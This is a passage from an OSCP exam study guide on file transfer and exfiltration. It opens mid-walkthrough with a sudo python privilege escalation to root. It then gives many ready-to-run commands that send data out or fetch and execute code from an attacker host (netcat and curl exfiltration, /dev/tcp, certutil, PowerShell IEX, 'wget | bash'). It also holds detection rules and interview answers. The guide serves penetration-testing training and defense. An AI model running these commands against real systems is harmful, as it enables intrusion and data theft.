[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Config file parsed
[*] Sharing /opt/tools/linux as share

# ═══════════════════════════════════════════════════════════
# ON LINUX TARGET (as www-data)
# ═══════════════════════════════════════════════════════════
www-data@target:/tmp$ mkdir /tmp/smb
www-data@target:/tmp$ mount -t cifs //10.10.14.5/share /tmp/smb

www-data@target:/tmp$ ls /tmp/smb
linpeas.sh  pspy64  exploit.sh

www-data@target:/tmp$ cp /tmp/smb/linpeas.sh .
www-data@target:/tmp$ chmod +x linpeas.sh
www-data@target:/tmp$ ./linpeas.sh

# LinPEAS finds sudo misconfiguration
# [+] Checking sudo tokens
# User www-data may run the following commands on target:
#     (root) NOPASSWD: /usr/bin/python3.8

www-data@target:/tmp$ sudo /usr/bin/python3.8 -c 'import os; os.system("/bin/bash")'

root@target:/tmp# whoami
root

root@target:/tmp# cat /root/proof.txt
a1b2c3d4e5f6...
```

**Time Breakdown**:
- SMB server setup (2 min)
- Mount SMB share (3 min)
- Copy and run LinPEAS (5 min)
- Exploit sudo (2 min)
- Buffer (3 min)

---

### Scenario 3: Exfiltrating Large Database (20 minutes)

**Situation**: Need to exfiltrate 50MB SQL database.

```bash
# ═══════════════════════════════════════════════════════════
# ON TARGET: DUMP DATABASE
# ═══════════════════════════════════════════════════════════
mysqldump -u root -p'password123' webapp_db > /tmp/dump.sql

# File is too large for base64 copy-paste
ls -lh /tmp/dump.sql
# -rw-r--r-- 1 root root 52M Jan 25 10:30 dump.sql

# ═══════════════════════════════════════════════════════════
# METHOD 1: COMPRESS FIRST
# ═══════════════════════════════════════════════════════════
tar czf /tmp/dump.tar.gz /tmp/dump.sql
ls -lh /tmp/dump.tar.gz
# -rw-r--r-- 1 root root 8.2M Jan 25 10:31 dump.tar.gz

# ═══════════════════════════════════════════════════════════
# METHOD 2: EXFILTRATE VIA NETCAT
# ═══════════════════════════════════════════════════════════
# On Kali (receiver):
nc -lvnp 4444 > dump.tar.gz

# On target (sender):
nc 10.10.14.5 4444 < /tmp/dump.tar.gz

# Verify integrity
md5sum /tmp/dump.tar.gz  # On target
md5sum dump.tar.gz       # On Kali - should match!

# ═══════════════════════════════════════════════════════════
# METHOD 3: EXFILTRATE VIA SCP (if SSH available)
# ═══════════════════════════════════════════════════════════
# If you have SSH creds or key:
scp /tmp/dump.tar.gz kali@10.10.14.5:/tmp/

# ═══════════════════════════════════════════════════════════
# METHOD 4: UPLOAD TO KALI HTTP SERVER (with upload support)
# ═══════════════════════════════════════════════════════════
# On Kali: Use updog (supports uploads)
pip3 install updog
updog -p 8080

# On target: Upload via curl
curl -F "file=@/tmp/dump.tar.gz" http://10.10.14.5:8080/upload
```

---

## 🛡️ DEFENSE & DETECTION

### How Blue Team Detects File Transfers

**1. Network Monitoring**:
```bash
# Unusual outbound connections
# IDS/IPS alerts on:
# • Connections to unknown IPs
# • Large data transfers
# • HTTP/HTTPS on non-standard ports
```

**2. Process Monitoring**:
```bash
# Suspicious commands:
# • certutil -urlcache (Windows)
# • powershell DownloadFile
# • wget/curl to external IPs
# • bitsadmin transfers
```

**3. File System Monitoring**:
```bash
# Files appearing in unusual locations:
# • C:\Users\Public\
# • C:\Windows\Temp\
# • /tmp/
# • /var/tmp/
```

**4. DNS Monitoring**:
```bash
# Unusual DNS queries:
# • Long subdomain names (base64 encoded data)
# • High volume of DNS requests
# • Requests to suspicious domains
```

### Defense Best Practices

**Network Level**:
```bash
# 1. Egress filtering (block outbound HTTP/HTTPS except whitelist)
# 2. DNS monitoring (detect exfiltration attempts)
# 3. SMB blocking (prevent lateral movement)
# 4. DPI (Deep Packet Inspection) on all traffic
```

**Endpoint Level**:
```bash
# 1. Application whitelisting (block certutil, bitsadmin for non-admins)
# 2. PowerShell logging (log all PowerShell commands)
# 3. AV/EDR with behavioral detection
# 4. Monitor suspicious directories (C:\Users\Public, C:\Temp)
```

**Detection Rules (Sigma/Splunk)**:
```yaml
# Detect certutil abuse
title: Suspicious Certutil Usage
detection:
  selection:
    CommandLine|contains:
      - 'certutil'
      - '-urlcache'
      - 'http'
  condition: selection
```

---

## 💼 INTERVIEW QUESTIONS

### Question 1: certutil vs PowerShell Downloads

**Q**: You're on a Windows box. When would you use certutil instead of PowerShell for file downloads?

**A**:

**Use certutil when**:
1. **PowerShell is blocked/disabled**
   - Application whitelisting prevents PowerShell execution
   - Constrained Language Mode restricts DownloadFile
   
2. **Less detection**
   - certutil is Microsoft-signed and trusted
   - Less likely to trigger AV/EDR alerts
   - Not as heavily monitored as PowerShell

3. **Simpler syntax**
   - One-liner: `certutil -urlcache -f http://url/file file`
   - No need to remember PowerShell object syntax

**Use PowerShell when**:
1. **Need advanced features**
   - Custom headers, authentication
   - Direct execution without disk write (IEX)
   - HTTP POST requests

2. **Flexibility**
   - Can download and process data in-memory
   - Easier to chain commands

**OSCP Answer**: "I'd try certutil first (simpler, less detection). If that fails (blocked or monitored), I'd use PowerShell with obfuscation. If both fail, I'd fall back to SMB or FTP."

---

### Question 2: File Transfer Without Tools

**Q**: You're on a Linux box with no wget, curl, nc, or python. How do you download a file from your attacking machine?

**A**:

**Method 1: Bash /dev/tcp**
```bash
# Create HTTP request manually
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /file.txt HTTP/1.0\r\n\r\n" >&3
cat <&3 > file.txt
```

**Method 2: Telnet**
```bash
telnet 10.10.14.5 80
GET /file.txt HTTP/1.0

# Save output manually
```

**Method 3: Compile a downloader**
```c
// If gcc is available, compile this:
#include <stdio.h>
#include <stdlib.h>
int main() {
    system("(printf 'GET /file.txt HTTP/1.0\\r\\n\\r\\n'; sleep 1) | telnet 10.10.14.5 80 > file.txt");
    return 0;
}
```

**Method 4: PHP/Perl/Ruby** (if available)
```bash
php -r '$f=fopen("file.txt","w"); fwrite($f,file_get_contents("http://10.10.14.5/file.txt")); fclose($f);'
```

**Interview Answer**: "I'd first check `/dev/tcp` support in bash. If that works, I can manually craft HTTP requests. Otherwise, I'd look for scripting languages (PHP, Perl, Ruby) or even compile a simple C program if gcc is available. As a last resort, I'd manually type a base64-encoded version of a small script."

---

### Question 3: Detecting File Exfiltration

**Q**: As a blue teamer, how would you detect an attacker exfiltrating data via DNS?

**A**:

**Detection Methods**:

1. **DNS Query Volume**
   - Baseline normal DNS requests per host
   - Alert on 10x increase in DNS queries

2. **Query Length**
   - Normal DNS queries: < 50 characters
   - Exfiltration: Often 60+ characters (base64 encoded data)
   - Alert on queries > 60 chars

3. **Query Patterns**
   - Look for sequential, high-entropy subdomains
   - Example: `dGVzdA==.example.com`, `ZGF0YQ==.example.com`

4. **Unusual Domains**
   - Requests to newly registered domains
   - Requests to domains with no web presence
   - Requests to suspicious TLDs (.tk, .ga, etc.)

5. **Frequency**
   - Many queries to same domain in short period
   - Example: 1000 queries to `example.com` in 1 minute

**Detection Rule** (Splunk):
```
index=dns 
| stats count by src_ip query 
| where count > 100 
| where len(query) > 60
```

**Mitigation**:
- DNS firewall (block suspicious domains)
- Monitor DNS logs in SIEM
- Limit DNS queries per host (rate limiting)

**Interview Answer**: "I'd implement DNS monitoring with three key metrics: query volume (alert on spikes), query length (flag queries > 60 chars), and pattern analysis (detect base64-like patterns). I'd also use DNS firewalls to block known exfiltration domains and integrate DNS logs into our SIEM for correlation with other suspicious activities."

---

### Question 4: File Transfer in Air-Gapped Network

**Q**: You've compromised a completely air-gapped system (no network connectivity). How do you exfiltrate data?

**A**:

**Physical Methods**:
1. **USB Drive** (if allowed)
   - Copy data to USB drive
   - Remove drive and connect to internet-connected system

2. **Screen Screenshots**
   - Display data on screen
   - Photograph with camera/phone
   - OCR to extract text later

3. **Acoustic/Electromagnetic**
   - Use malware that leaks data via:
     - Sound (ultrasonic data transmission)
     - Electromagnetic emanations (van Eck phreaking)
     - LED blinking patterns

**Bridging Techniques** (if limited connectivity exists):
1. **Bluetooth/Wi-Fi**
   - Even if ethernet is disabled, wireless might work
   - Transfer to nearby device with internet

2. **Sneakernet**
   - Compromise admin's laptop that travels between networks
   - Use as data mule

3. **Side Channels**
   - CPU usage patterns
   - Power consumption variations
   - Timing attacks

**For Sensitive Environments**:
- Compromise the air gap itself
- Wait for removable media (USB, CD) insertion
- Infect the media for later retrieval

**Interview Answer**: "True air-gap exfiltration requires creative thinking. If physical access is possible, I'd use USB drives or photograph screens. For advanced scenarios, I'd explore side-channel attacks like acoustic data transmission or electromagnetic leakage. The key is identifying ANY channel that crosses the air gap - even if it's just an admin's laptop that moves between networks."

---

### Question 5: OSCP File Transfer Strategy

**Q**: Walk me through your file transfer process during an OSCP exam machine.

**A**:

**Pre-Exam Preparation**:
```bash
# Create tools directory structure
~/oscp/
├── linux/
│   ├── linpeas.sh
│   ├── pspy64
│   ├── chisel
│   └── static-binaries/
└── windows/
    ├── winpeas.exe
    ├── PrintSpoofer64.exe
    ├── nc.exe
    └── mimikatz.exe
```

**During Exam - Linux Target**:
```bash
# 1. Start HTTP server (keep running entire exam)
cd ~/oscp/linux
python3 -m http.server 80

# 2. On target, try in order:
wget http://10.10.14.5/linpeas.sh     # First choice
curl http://10.10.14.5/linpeas.sh -o linpeas.sh  # If wget fails
# If both fail, use SMB:
impacket-smbserver share ~/oscp/linux

# 3. Verify transfer
md5sum linpeas.sh  # Compare with Kali
```

**During Exam - Windows Target**:
```cmd
REM 1. Try certutil (works 90% of time)
certutil -urlcache -f http://10.10.14.5/winpeas.exe wp.exe

REM 2. If certutil fails, try PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/winpeas.exe', 'wp.exe')"

REM 3. If both fail, use SMB
\\10.10.14.5\share\winpeas.exe
```

**Time Management**:
- Don't spend > 5 minutes on file transfer
- If method fails after 2 attempts, switch to alternative
- Always verify file integrity (hash check)

**Interview Answer**: "I maintain a well-organized tools directory and run a Python HTTP server throughout the exam. For Linux, I default to wget, then curl, then SMB if needed. For Windows, certutil is my go-to, followed by PowerShell and SMB. I never spend more than 5 minutes on transfers - if a method doesn't work in 2 attempts, I immediately switch techniques. Efficiency is key in time-limited environments like OSCP."

---

## 📚 QUICK REFERENCE CHEAT SHEET

### Linux File Transfer Commands

```bash
# ══════════════════════════════════════════════════════════
# HTTP SERVER (KALI)
# ══════════════════════════════════════════════════════════
python3 -m http.server 80
php -S 0.0.0.0:80
ruby -run -ehttpd . -p80

# ══════════════════════════════════════════════════════════
# DOWNLOAD (TARGET)
# ══════════════════════════════════════════════════════════
wget http://10.10.14.5/file
curl http://10.10.14.5/file -o file
wget -O - http://10.10.14.5/script.sh | bash  # Execute

# ══════════════════════════════════════════════════════════
# NETCAT TRANSFER
# ══════════════════════════════════════════════════════════
# Receiver: nc -lvnp 4444 > file
# Sender:   nc IP 4444 < file

# ══════════════════════════════════════════════════════════
# SMB SHARE
# ══════════════════════════════════════════════════════════
# Kali:   impacket-smbserver share /path -smb2support
# Target: mount -t cifs //10.10.14.5/share /mnt/share

# ══════════════════════════════════════════════════════════
# BASE64 (SMALL FILES)
# ══════════════════════════════════════════════════════════
# Encode: base64 -w0 file
# Decode: echo 'base64string' | base64 -d > file
```

### Windows File Transfer Commands

```cmd
REM ═══════════════════════════════════════════════════════════
REM CERTUTIL (BEST OPTION)
REM ═══════════════════════════════════════════════════════════
certutil -urlcache -f http://10.10.14.5/file.exe file.exe

REM ═══════════════════════════════════════════════════════════
REM POWERSHELL
REM ═══════════════════════════════════════════════════════════
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe', 'file.exe')"
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')

REM ═══════════════════════════════════════════════════════════
REM SMB SHARE
REM ═══════════════════════════════════════════════════════════
REM Kali:   impacket-smbserver share /path -smb2support
REM Target: copy \\10.10.14.5\share\file.exe .

REM ═══════════════════════════════════════════════════════════
REM BITSADMIN
REM ═══════════════════════════════════════════════════════════
bitsadmin /transfer job /download /priority high http://10.10.14.5/file.exe C:\Users\Public\file.exe

REM ═══════════════════════════════════════════════════════════
REM BASE64 (SMALL FILES)
REM ═══════════════════════════════════════════════════════════
REM Decode: [IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String("base64string"))
```

---

## 🎯 OSCP Exam Strategy

### File Transfer Checklist (Every Machine)

**Preparation** (Before Exam):
- [ ] Organize tools directory (`~/oscp/linux/`, `~/oscp/windows/`)
- [ ] Test all transfer methods in lab
- [ ] Create quick reference notes
- [ ] Verify tool versions (LinPEAS, WinPEAS up-to-date)

**During Exam** (Per Machine):
- [ ] Start Python HTTP server (`python3 -m http.server 80`)
- [ ] Start SMB server (`impacket-smbserver share ~/oscp/linux`)
- [ ] Upload enumeration scripts (LinPEAS/WinPEAS) - 5 min max
- [ ] Upload privilege escalation tools - 5 min max
- [ ] Download flags/proofs immediately after obtaining - 2 min
- [ ] Verify file integrity (hash check)

**Time Limits** (Don't exceed!):
- File transfer issues: Max 10 minutes
- If stuck, switch methods immediately
- SMB is usually the fallback that always works

### Decision Tree: Which Method?

```
Got shell on target?
│
├─ Linux
│  ├─ wget available? → wget http://10.10.14.5/file
│  ├─ curl available? → curl http://10.10.14.5/file -o file
│  ├─ nc available? → Use netcat transfer
│  └─ Nothing? → SMB or base64
│
└─ Windows
   ├─ certutil available? (99% yes) → certutil -urlcache -f http://10.10.14.5/file
   ├─ PowerShell allowed? → (New-Object Net.WebClient).DownloadFile()
   ├─ SMB accessible? → \\10.10.14.5\share\file
   └─ Desperate? → base64 or VBScript
```

---

## 🏆 Final Tips

**For OSCP Success**:
1. **Master 3 methods** for each OS (Linux: wget, SMB, nc / Windows: certutil, SMB, PowerShell)
2. **Keep HTTP server running** throughout entire exam
3. **Verify transfers** with hash checks (md5sum / certutil -hashfile)
4. **Don't waste time** - if method fails twice, switch immediately
5. **Document everything** - note what worked for exam report

**For Real Pentesting**:
1. **Understand restrictions** - Ask client about egress filtering, AV, monitoring
2. **Be stealthy** - Use LOLBAS/GTFOBins when possible
3. **Clean up** - Delete tools after engagement
4. **Test multiple methods** - Always have backup plan

**Common Mistakes to Avoid**:
- ❌ Not verifying file transferred completely (partial downloads)
- ❌ Forgetting to make files executable (`chmod +x`)
- ❌ Using wrong IP address (VPN vs. local)
- ❌ Running HTTP server in wrong directory
- ❌ Not testing transfers before starting exam

---

**Good luck, and may your files always transfer successfully! 📁✨**

---

**Document Version**: 1.0
**Last Updated**: January 2024
**Target Audience**: OSCP candidates & fresh security graduates
**Estimated Study Time**: 15-20 hours for OSCP mastery

# End of Document
